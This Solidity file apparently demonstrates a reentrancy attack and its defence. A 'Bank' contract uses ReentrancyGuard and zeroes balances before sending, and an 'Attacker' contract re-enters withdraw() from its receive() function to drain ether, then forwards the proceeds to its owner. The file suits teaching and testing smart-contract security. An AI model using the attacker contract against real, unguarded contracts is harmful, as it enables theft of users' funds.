// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol";
contract Bank is ReentrancyGuard {

    mapping(address => uint) public balances; 
   // bool internal isEntering;// false

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    //function withdraw() external nonReentrant() {
    function withdraw() external nonReentrant(){
        uint currentBalance =  balances[msg.sender];
        balances[msg.sender] = 0;
        (bool result, ) = msg.sender.call{value:currentBalance}("");
        require(result, "ERROR");
      
       
    }

    function chekcBalance() external view returns(uint256){
        return address(this).balance;
    }

/*
    modifier nonReentrant() {
        require(!isEntering, "ERROR: nonReentrant");
        isEntering = true;
        _;
        isEntering = false;
    }

*/


}

contract Attacker {

    event Info(string info);
    Bank public bank;
    address public owner;
    receive() payable external {
        if(address(msg.sender).balance>0) { // 6 ether
            bank.withdraw();
        }else{
            emit Info("Thank you for your ether :)");
        }
    }

    constructor(address _bank, address _owner) {
        bank = Bank(_bank);
        owner = _owner;
    }

    function sendEther() external payable {
        bank.deposit{value:msg.value}();
    }

    function withdrawEther() external {
        bank.withdraw();
    }

    function chekcBalance() external view returns(uint) {
        return address(this).balance;
    }

    function giveMeEther() external {
        (bool result,) = owner.call{value:address(this).balance}("");
        require(result,"ERROR");
    }

}